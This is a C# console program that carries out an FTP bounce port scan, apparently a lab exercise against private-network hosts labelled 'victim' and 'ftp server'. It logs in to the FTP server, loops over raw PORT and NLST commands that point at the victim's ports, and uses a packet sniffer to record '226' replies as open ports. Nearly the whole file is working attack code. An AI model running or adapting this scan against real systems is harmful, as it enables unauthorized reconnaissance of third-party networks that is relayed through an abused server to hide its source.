using FluentFTP;
using PcapDotNet.Core;
using PcapDotNet.Packets;
using System;
using System.Collections.Generic;
using System.Threading;

namespace ConsoleApp3
{
    internal class Program
    {
        #region Machines (username, password)
        // For each machine the name is also the password.
        private static string victimIp = "192.168.86.3";
        private static string ftpSrverIp = "192.168.86.5";
        private static string victimName = "ubuntu";
        private static string ftpServerName = "windows";
        #endregion

        private static FtpClient fc;
        private static object scannerSnifferLock = new object();
        private static List<int> openPorts = new List<int>();

        private static void Main(string[] args)
        {
            Thread sniffer = new Thread(Sniff);
            Thread portScanner = new Thread(ScanPorts);

            ConnectToFtpServer();

            sniffer.Start();
            // One second delay in order to allow the sniffer to start.
            Thread.Sleep(1000);
            portScanner.Start();

            PrintOpenPorts();
        }

        private static void PrintOpenPorts()
        {
            Console.WriteLine("Summery:");

            foreach(var i in openPorts)
                Console.WriteLine("Open port at " + victimIp + ":" + i);
        }

        private static void ScanPorts()
        {
            // Sniff for sockets 1025 to 65535 (IANA unprivileged ports).
            for(int p1 = 4; p1 < 256; p1++)
            {
                for(int p2 = 1; p2 < 256; p2++)
                {
                    Console.Write("\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b");
                    Console.Write($"Scanning {victimIp}:{(p1 * 256) + p2}");

                    try
                    {
                        // Iterate port numbers and Send two raw ftp
                        // commands to the ftp server machine:
                        //   Open a port connection to the victim machine. 
                        //   Send a 'List' command on thet port.
                        //
                        // If the port is open on the victim machine an ftp 226 response is sent back.
                        fc.Execute($"PORT {victimIp.Replace('.', ',')},{p1},{p2}");
                        fc.Execute("NLST");
                    }
                    catch(FluentFTP.FtpException e) { Console.WriteLine(e.Message); }
                }
            }

        }
        private static void ConnectToFtpServer()
        {
            fc = new FtpClient(ftpSrverIp, new System.Net.NetworkCredential(ftpServerName, ftpServerName));

            try { fc.Connect(); }
            catch(FtpCommandException error)
            {
                Console.WriteLine(error.Message);
            }
        }
        private static void Sniff()
        {
            var device = LivePacketDevice.AllLocalMachine[5];

            using(PacketCommunicator pc = device.Open(65536, PacketDeviceOpenAttributes.MaximumResponsiveness, 0))
            {
                pc.ReceivePackets(0, PacketHandler);
            }
        }
        private static void PacketHandler(Packet packet)
        {
            if(packet.Ethernet.IpV4.Protocol == PcapDotNet.Packets.IpV4.IpV4Protocol.Tcp)
            {
                string payload = packet.Ethernet.IpV4.Tcp.Payload.Decode(System.Text.Encoding.ASCII);
                if(payload.Length != 0 && payload.Substring(0, 3) == "226")
                {
                    Console.WriteLine($"\nBINGO! Open port at {victimIp}:{packet.Ethernet.IpV4.Tcp.SourcePort}");
                    openPorts.Add(packet.Ethernet.IpV4.Tcp.SourcePort);
                }
            }
        }
    }
}